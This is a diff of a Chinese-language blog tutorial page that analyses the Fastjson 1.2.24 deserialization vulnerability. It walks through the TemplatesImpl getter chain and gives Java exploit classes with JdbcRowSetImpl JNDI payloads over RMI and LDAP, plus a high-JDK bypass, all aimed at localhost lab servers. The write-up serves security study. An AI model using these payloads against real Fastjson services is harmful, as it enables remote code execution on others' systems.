@@ -317,14 +317,14 @@
 </ul>
 <hr>
 <h3 id="1-链子分析"><a href="#1-链子分析" class="headerlink" title="1. 链子分析"></a>1. 链子分析</h3><h4 id="选取能够命令执行的类"><a href="#选取能够命令执行的类" class="headerlink" title="选取能够命令执行的类"></a>选取能够命令执行的类</h4><p>这里，我们要回想起之前在学习 CC 链的时候有一条链子 CC3 链开辟了 <code>TemplatesImpl</code> 加载字节码的先河，而它的漏洞点在于调用了 <code>.newInstance()</code> 方法。我们现在回去看这里，发现漏洞点的地方实际上是一个 <code>getter</code> 方法，如图。</p>
-
+<img src="/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/TemplatesImplGetter.png" class>
 
 <p>所以 <code>TemplatesImpl</code> 是满足我们 fastjson 漏洞的利用条件的，在构造 EXP 之前，先分析一下 EXP 里面的一些参数。</p>
 <h4 id="分析-TemplatesImpl-里面的参数"><a href="#分析-TemplatesImpl-里面的参数" class="headerlink" title="分析 TemplatesImpl 里面的参数"></a>分析 TemplatesImpl 里面的参数</h4><p>个人觉得这一步和当时学习 CC3 链子的时候非常像。之前是通过反射修改，这里直接放到 json 字符串里面就可以。</p>
 <ul>
 <li>先看 TemplatesImpl 类中的 <code>getTransletInstance()</code> 方法。这里可以直接参考 CC3	 链子的构造。</li>
 </ul>
-
+<img src="/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getTransletInstance.png" class>
 
 <p><code>_name</code> 不可以为 null，需要 <code>_class</code> 为 null，这样进入到 <code>defineTransletClasses</code> 这个方法里面。所以 <code>_class</code> 可以不用写，或者写为 null。<code>_tfactory</code> 也不能为 null，具体可以见这篇 CC3 的分析文章，如果 CC 链都掌握的话，用这条 TemplatesImpl 链加载字节码是很容易理解的。</p>
 <p><code>_bytecodes</code> 是恶意字节码。恶意字节码的类需要</p>
@@ -350,10 +350,10 @@
 <h4 id="解决无法调用-getTransletInstance-方法的问题"><a href="#解决无法调用-getTransletInstance-方法的问题" class="headerlink" title="解决无法调用 getTransletInstance() 方法的问题"></a>解决无法调用 <code>getTransletInstance()</code> 方法的问题</h4><ul>
 <li>这里用到的也是链子的思维，我们去找谁调用了 <code>getTransletInstance()</code>，右键 find usages</li>
 </ul>
-
+<img src="/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/newTransformer.png" class>
 
 <p>看着是 <code>newTransformer()</code> 方法调用了 <code>getTransletInstance()</code> 方法，但是无法了利用，因为它不是 setter&#x2F;getter 方法，继续找。</p>
-
+<img src="/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getOutputProperties.png" class>
 
 <p>此处我们找到一个 <code>getOutputProperties()</code> 调用了 <code>newTransformer()</code>。大致的链子是这样</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()  ---&gt; newTransformer() ---&gt; TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line"> _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure>
@@ -370,7 +370,7 @@
 <ul>
 <li>成功弹出计算器</li>
 </ul>
-
+<img src="/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/SuccessCalc.png" class>
 
 <h2 id="0x04-基于-JdbcRowSetImpl-的利用链"><a href="#0x04-基于-JdbcRowSetImpl-的利用链" class="headerlink" title="0x04 基于 JdbcRowSetImpl 的利用链"></a>0x04 基于 JdbcRowSetImpl 的利用链</h2><blockquote>
 <p>简单来说就是 JNDI 注入的形式，也就是我们平常用的最多的攻击手段。</p>
@@ -394,7 +394,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 基于 JdbcRowSetImpl 的利用链  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplExp</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>成功</p>
-
+<img src="/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/SuccessJNDIRmi.png" class>
 
 <h3 id="2-JNDI-LDAP"><a href="#2-JNDI-LDAP" class="headerlink" title="2. JNDI + LDAP"></a>2. JNDI + LDAP</h3><ul>
 <li>原理一致，直接上 Server 和 EXP 了</li>
@@ -406,7 +406,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplLdapExp</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>成功</p>
-
+<img src="/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/SuccessJNDILdap.png" class>
 
 <h2 id="0x05-Fastjson-攻击中-jdk-高版本的绕过"><a href="#0x05-Fastjson-攻击中-jdk-高版本的绕过" class="headerlink" title="0x05 Fastjson 攻击中 jdk 高版本的绕过"></a>0x05 Fastjson 攻击中 jdk 高版本的绕过</h2><p>这里是针对基于 JdbcRowSetImpl 的利用链的 jdk 高版本绕过，绕过手段和之前是一样的，直接放 EXP 了。</p>
 <p><strong>JNDIBypassHighJavaServerEL.java</strong></p>
@@ -416,11 +416,11 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HighJdkBypass</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>值得一提的是，这个 EXP 需要 CC 链的环境，当时我这里踩了坑哈哈。</p>
-
+<img src="/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/SuccessBypassJDK.png" class>
 
 <h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><p>先小结一下两种攻击方式，TemplatesImpl 是有一点限制的，需要对方的代码里面能够让我们加载的私有的 getter&#x2F;setter。也就是需要这个参数 <code>Feature.SupportNonPublicField</code></p>
 <p>第二种攻击方式，需要针对 jdk 版本吧，不过平常攻击肯定是第二种用的比较多。</p>
-<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" >Fastjson系列二——1.2.22-1.2.24反序列化漏洞 [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞 [ Mi1k7ea ]<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
